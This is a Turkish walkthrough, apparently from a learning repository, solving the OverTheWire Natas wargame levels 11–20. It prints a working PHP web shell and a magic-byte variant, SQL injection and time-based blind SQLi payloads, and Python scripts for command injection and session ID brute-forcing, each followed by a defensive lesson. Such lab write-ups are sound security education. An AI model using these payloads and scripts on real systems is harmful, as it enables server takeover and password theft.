# 🌐 OverTheWire: Natas — Level 11'den Level 20'ye Türkçe Rehber

> Bu bölümde işler ciddileşiyor: XOR şifre kırma, dosya yükleme saldırıları,  
> SQL injection, blind SQLi ve session/cookie manipülasyonu.  
> Python scriptleri yazmaya başlıyoruz!

**Önceki bölüm:** [natas_0-10.md](./natas_0-10.md)  
**Referans:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-7-13/)

---

## 🗺️ Genel Bakış

| Level | Konu | Teknik |
|---|---|---|
| 11 → 12 | XOR cookie şifrelemesi | Cookie kırma + CyberChef |
| 12 → 13 | Dosya yükleme (File Upload) | Web shell yükleme |
| 13 → 14 | Magic byte bypass | JPEG header + PHP web shell |
| 14 → 15 | SQL Injection | `OR "1"="1"` bypass |
| 15 → 16 | Blind SQL Injection | Python brute-force |
| 16 → 17 | Komut enjeksiyonu (filtreli) | `$()` ile grep çıktısı sızdırma |
| 17 → 18 | Time-based Blind SQLi | `SLEEP()` ile karakter tespiti |
| 18 → 19 | Session ID brute-force | Python ile 640 olası ID deneme |
| 19 → 20 | Hex-encoded session | ID formatını tersine çevir |
| 20 → 21 | Session enjeksiyonu | Newline `%0A` ile session poisoning |

---

## Level 11 → Level 12 — XOR Cookie Kırma

### 🎯 Görev
Site arka plan rengini XOR şifreli cookie'de saklıyor. `showpassword=yes` yapacak yeni bir cookie oluştur.

### 📖 Teori: XOR Şifreleme ve Cookie Kırma

**XOR özelliği:**
```
plaintext XOR key = ciphertext
ciphertext XOR key = plaintext
ciphertext XOR plaintext = key   ← bunu kullanacağız!
```

Cookie oluşturma: `json_encode → XOR → base64_encode`  
Cookie okuma: `base64_decode → XOR → json_decode`

Eğer hem şifreli cookie'yi hem de şifresiz içeriğini biliyorsak → ikisini XOR'layınca anahtarı buluruz!

### 🔧 Çözüm

**Adım 1 — Mevcut cookie'yi al:**
```
F12 → Application/Storage → Cookies
"data" cookie değerini kopyala
Örn: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

**Adım 2 — Aynı değerlerin şifresiz base64'ünü üret:**
```
{"showpassword":"no","bgcolor":"#ffffff"}
→ base64: eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=
```

**Adım 3 — CyberChef ile XOR → anahtarı bul:**
1. [CyberChef](https://gchq.github.io/CyberChef/) aç
2. Cookie değerini → "From Base64" işlemi
3. Sonucu → "XOR" işlemi (key: base64 encoded plaintext)
4. Anahtar: `qw8J` (tekrar ediyor)

**Adım 4 — Yeni cookie oluştur (`showpassword=yes`):**
1. `{"showpassword":"yes","bgcolor":"#ffffff"}` → XOR (key: `qw8J`) → Base64
2. Yeni cookie değeri: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

**Adım 5 — Cookie'yi değiştir:**
```
F12 → Application/Storage → Cookies
"data" değerini yeni değerle değiştir → sayfayı yenile
```

> 💡 **Ders:** Kısa ve tekrar eden XOR anahtarı güvenli şifreleme değildir. Aynı key ile birden fazla mesaj şifrelenirse key ortaya çıkar.

---

## Level 12 → Level 13 — Web Shell Yükleme (File Upload)

### 🎯 Görev
Resim yükleme formu var. PHP web shell yükleyip sunucuda komut çalıştır.

### 📖 Teori: Web Shell ve Client-Side Bypass

**Web Shell:** Sunucuya yüklenen, HTTP üzerinden komut çalıştırmaya olanak tanıyan script.

Kaynak kodda dosya adı client-side'da `.jpg` uzantısına zorlanıyor — ama bu HTML'de yapılıyor, sunucu tarafında değil! DevTools ile değiştirilebilir.

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
Bu web shell `?e=komut` ile çalışır.

### 🔧 Çözüm

```
1. shell.php dosyası oluştur:
   <?php echo shell_exec($_GET['e'].' 2>&1'); ?>

2. F12 → Elements → upload formunu bul
   Gizli input'ta filename uzantısını ".jpg"den ".php"ye değiştir

3. shell.php'yi yükle → sunucu .php olarak kabul eder

4. Verilen URL'ye git + ?e= ekle:
   http://natas12.natas.labs.overthewire.org/upload/abc123.php?e=cat /etc/natas_webpass/natas13
```

> 💡 **Ders:** Client-side filtering (tarayıcıda yapılan kontroller) güvenlik sağlamaz. Dosya tipi kontrolü sunucu tarafında MIME type ve içerik kontrolüyle yapılmalı.

---

## Level 13 → Level 14 — Magic Byte Bypass (JPEG Header)

### 🎯 Görev
Artık `exif_imagetype()` ile dosyanın gerçekten resim olup olmadığı kontrol ediliyor. Yine de PHP shell yükle.

### 📖 Teori: Magic Byte / Dosya İmzası

Her dosya tipi başında özel byte'lar (magic bytes) taşır:
- JPEG: `FF D8 FF` (ya da `GIF87a`)
- PNG: `89 50 4E 47`

`exif_imagetype()` bu byte'lara bakarak dosya tipini belirler. Eğer dosyanın başına gerçek bir JPEG header koyarsak, PHP kodu ekleyebiliriz!

### 🔧 Çözüm

```
1. shell.php dosyası oluştur:
   GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
   (GIF87a = GIF magic header, server bunu resim sanır)

2. F12 → Elements → filename uzantısını ".php"ye değiştir

3. Dosyayı yükle

4. Yüklenen URL + ?e=cat /etc/natas_webpass/natas14
```

> 💡 **Ders:** Dosya tipi kontrolü sadece magic byte'a bakılarak yapılmamalı. İçerik analizi, whitelist ve execution yetkisi kısıtlaması gerekli.

---

## Level 14 → Level 15 — SQL Injection

### 🎯 Görev
Login formu var. SQL injection ile kimlik doğrulamayı atla.

### 📖 Teori: SQL Injection

PHP kaynak kodu:
```php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . 
         "\" and password=\"" . $_REQUEST["password"] . "\"";
```

Kullanıcı girdisi doğrudan SQL sorgusuna dahil ediliyor! Şu girişi düşün:
```
password: anything" or "1" = "1
```

Oluşan sorgu:
```sql
SELECT * FROM users WHERE username="admin" AND password="anything" OR "1"="1"
```

`"1"="1"` her zaman doğru → WHERE koşulu her zaman true → tüm kullanıcılar döner → giriş başarılı!

### 🔧 Çözüm

```
Username: admin
Password: anything" or "1"="1

→ "Access granted" ve şifre görünür
```

**curl ile:**
```bash
curl 'http://natas14.natas.labs.overthewire.org/' \
  -u natas14:<şifre> \
  --data-raw 'username=admin&password=anything" or "1"="1&debug='
```

> 💡 **Ders:** Kullanıcı girdisi asla doğrudan SQL sorgusuna eklenmemeli. Prepared statements (parametreli sorgular) kullan!

---

## Level 15 → Level 16 — Blind SQL Injection (Python Brute-force)

### 🎯 Görev
Bu sefer sadece "kullanıcı var/yok" bilgisi alıyoruz, şifreyi direkt göremiyoruz. Blind SQLi ile karakteri karakterine brute-force yap.

### 📖 Teori: Blind SQL Injection

Kaynak kodda:
```php
if(mysqli_num_rows($res) > 0) {
    echo "This user exists.";
} else {
    echo "This user doesn't exist.";
}
```

Direkt hata yok ama "var/yok" cevabı binary bilgi veriyor. Her karakteri tek tek sorgulayabiliriz:
```sql
username: natas16" AND password LIKE BINARY "a%" --
```
Eğer "This user exists" dönerse → şifre 'a' ile başlıyor!

### 🔧 Çözüm

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "<şifre>")
charset = string.ascii_letters + string.digits

found = ""
for i in range(1, 33):
    for ch in charset:
        payload = f'natas16" AND password LIKE BINARY "{found + ch}%" -- '
        res = requests.post(url, data={"username": payload}, auth=auth)
        if "This user exists." in res.text:
            found += ch
            print(f"[+] Bulunan: {found}")
            break

print(f"\n[✅] Şifre: {found}")
```

> 💡 **Ders:** Hata mesajı olmasa bile "var/yok" gibi boolean cevaplar bilgi sızdırır. LIKE BINARY büyük/küçük harf duyarlı arama yapar.

---

## Level 16 → Level 17 — Filtreli Komut Enjeksiyonu (grep ile sızdırma)

### 🎯 Görev
Artık `; | & ' "` karakterleri filtreleniyor. Başka yol bul.

### 📖 Teori: `$()` ile Komut İkamesi

`$()` (command substitution) bash'te bir komutun çıktısını başka bir komuta argüman olarak geçirir. Bu karakterler filtrelenmemiş!

```bash
# Eğer grep'in arama terimi içinde $() kullanılırsa:
grep -i "$(grep ^a /etc/natas_webpass/natas17)anything" dictionary.txt

# Eğer şifre 'a' ile başlıyorsa:
# → inner grep bir şey döner → outer grep hiçbir şey bulamaz ("anything" yok)
# Eğer 'a' ile başlamıyorsa:
# → inner grep boş döner → outer grep "anything" kelimesini arar → sonuç döner
```

### 🔧 Çözüm

```python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "<şifre>")
charset = string.ascii_letters + string.digits

found = ""
for i in range(1, 33):
    for ch in charset:
        payload = f'$(grep ^{found + ch} /etc/natas_webpass/natas17)'
        res = requests.get(url, params={"needle": payload + "anything"}, auth=auth)
        if "anything" not in res.text:
            found += ch
            print(f"[+] Bulunan: {found}")
            break

print(f"[✅] Şifre: {found}")
```

> 💡 **Ders:** Blacklist tabanlı filtreler yetersizdir. `$()`, backtick gibi alternatif injection yolları var. Whitelist kullan!

---

## Level 17 → Level 18 — Time-Based Blind SQL Injection

### 🎯 Görev
Artık hiçbir mesaj yok — ekranda "var/yok" bile çıkmıyor. `SLEEP()` ile yanıt süresine bakarak karakterleri bul.

### 📖 Teori: Time-Based Blind SQLi

Ekranda hiçbir şey görünmese de sunucu işlem yapar. `IF(koşul, SLEEP(5), 0)` ile:
- Koşul doğruysa → sunucu 5 saniye bekler → response geç gelir
- Koşul yanlışsa → anında döner

```sql
username: natas18" AND IF(BINARY SUBSTRING(password,1,1)="a", SLEEP(5), 0) -- -
```

### 🔧 Çözüm

```python
import requests, string

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "<şifre>")
charset = string.ascii_letters + string.digits

found = ""
for pos in range(1, 33):
    for ch in charset:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP(5), 0) -- -'
        r = requests.post(url, data={"username": payload}, auth=auth)
        if r.elapsed.total_seconds() > 5:
            found += ch
            print(f"[+] Bulunan: {found}")
            break

print(f"[✅] Şifre: {found}")
```

> 💡 **Ders:** Hiçbir çıktı olmasa bile timing (süre) bilgi sızdırır. Ağ gecikmesi için eşiği 4-5 saniye ayarlamak yeterli.

---

## Level 18 → Level 19 — Session ID Brute-force

### 🎯 Görev
Admin session'ı almak için `PHPSESSID` değerini 1-640 arasında brute-force yap.

### 📖 Teori: Session ID ve Güvenlik

PHP session ID'leri genellikle rastgele ve uzun olur. Ama bu level 1-640 arası basit integer kullanıyor — brute-force mümkün!

```
PHPSESSID=1 → normal user
PHPSESSID=2 → normal user
...
PHPSESSID=119 → admin!
```

### 🔧 Çözüm

```python
import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "<şifre>")

for i in range(0, 641):
    headers = {'Cookie': f'PHPSESSID={i}'}
    response = requests.get(url, headers=headers, auth=auth)
    print(f'[+] Deneniyor: {i}')
    if "You are logged in as a regular user" not in response.text and "login" not in response.text.lower():
        print(f"\n[✅] Admin PHPSESSID: {i}")
        print(response.text[:500])
        break
```

Doğru ID'yi bulunca tarayıcıda cookie'yi manuel değiştir → şifre görünür.

> 💡 **Ders:** Session ID'ler kısa ve tahmin edilebilir olmamalı. Kriptografik rastgelelik şart.

---

## Level 19 → Level 20 — Hex-Encoded Session Format

### 🎯 Görev
Session ID artık basit integer değil — hex encoded `id-kullanıcı` formatında. `admin` için doğru hex'i bul.

### 📖 Teori: Session ID Format Analizi

```
Giriş: user=test → PHPSESSID: 37342d74657374
Decode: 37 34 2d 74 65 73 74 → "74-test"
```

Format: `{id}-{username}` → hex encoded. Admin için: `{id}-admin` → hex.

### 🔧 Çözüm

```python
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "<şifre>")

for i in range(0, 641):
    value = f"{i}-admin"
    hex_data = value.encode('utf-8').hex()
    headers = {'Cookie': f'PHPSESSID={hex_data}'}
    print(f'[+] Deneniyor: {value}')
    response = requests.get(url, headers=headers, auth=auth)
    if "You are logged in as a regular user" not in response.text and "login" not in response.text.lower():
        print(f"\n[✅] Admin: {value} / Hex: {hex_data}")
        break
```

Doğru hex değerini tarayıcı cookie'sine yaz → şifre görünür.

---

## Level 20 → Level 21 — Session Dosyasına Enjeksiyon (Newline)

### 🎯 Görev
Session verisine `admin=1` satırı ekle. `%0A` (newline) ile session dosyasına yeni satır enjekte et.

### 📖 Teori: Session File Injection

PHP session dosyaları `key value` formatında satır satır saklanır:
```
name|s:4:"test";
```

Eğer değere newline (`\n` / `%0A`) ekleyebiliyorsak, yeni satır eklenir:
```
name|s:14:"test
admin 1";
```
→ Session dosyasında `admin = 1` satırı oluşur!

### 🔧 Çözüm

```
1. "Your name" alanına gir:
   admin%0Aadmin 1
   (%0A = URL-encoded newline)

2. Formu gönder

3. Sayfayı yenile → admin=1 okunur → şifre görünür
```

**curl ile:**
```bash
# Önce yaz
curl -c /tmp/cookies.txt 'http://natas20.natas.labs.overthewire.org/?debug' \
  -u natas20:<şifre> \
  --data-raw 'name=admin%0Aadmin+1&submit=Submit'

# Sonra oku
curl -b /tmp/cookies.txt 'http://natas20.natas.labs.overthewire.org/?debug' \
  -u natas20:<şifre>
```

> 💡 **Ders:** Session verisi asla kullanıcı girdisiyle doğrudan oluşturulmamalı. Newline karakterleri özellikle tehlikeli — sanitize et!

---

## 📚 Öğrenilen Web Güvenliği Kavramları (Level 11-20)

| Kavram | Açıklama |
|---|---|
| **XOR Cookie Kırma** | Bilinen plaintext + ciphertext → key |
| **Web Shell** | Sunucuya yüklenen komut çalıştırma scripti |
| **Magic Byte Bypass** | Dosya başına gerçek header koyarak tip kontrolünü atlatma |
| **SQL Injection** | Kullanıcı girdisiyle SQL sorgusunu manipüle etme |
| **Blind SQLi (Boolean)** | "var/yok" cevabından bilgi sızdırma |
| **Blind SQLi (Time-based)** | Yanıt süresinden bilgi sızdırma |
| **Command Injection (filtreli)** | `$()` ile alternatif injection |
| **Session ID Brute-force** | Zayıf session ID'leri deneme |
| **Session Injection** | Newline ile session dosyasına satır ekleme |

## 📚 Kullanılan Araçlar

| Araç | Ne için |
|---|---|
| [CyberChef](https://gchq.github.io/CyberChef/) | XOR, base64, hex işlemleri |
| `F12 DevTools` | Cookie, element düzenleme |
| `curl` | HTTP isteği gönderme |
| `Python requests` | Otomatik brute-force scriptleri |
| `xxd -r -p` | Hex decode |

---

**Önceki bölüm:** [natas_0-10.md](./natas_0-10.md)  
**Sonraki bölüm:** [natas_21-34.md](./natas_21-34.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
